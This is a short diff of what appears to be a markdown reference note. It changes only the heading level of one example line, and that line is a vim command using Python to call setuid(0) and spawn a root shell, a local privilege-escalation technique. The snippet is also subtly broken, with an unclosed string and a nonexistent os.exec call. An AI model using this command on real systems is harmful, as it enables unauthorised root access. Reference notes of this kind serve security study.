@@ -6,6 +6,6 @@
 
 ## Example:
 
-## ./vim -c ':py3 import os; os.setuid(0); os.exec("/bin/sh, "sh", "-c", "reset; exec sh")'
+### ./vim -c ':py3 import os; os.setuid(0); os.exec("/bin/sh, "sh", "-c", "reset; exec sh")'
 
 
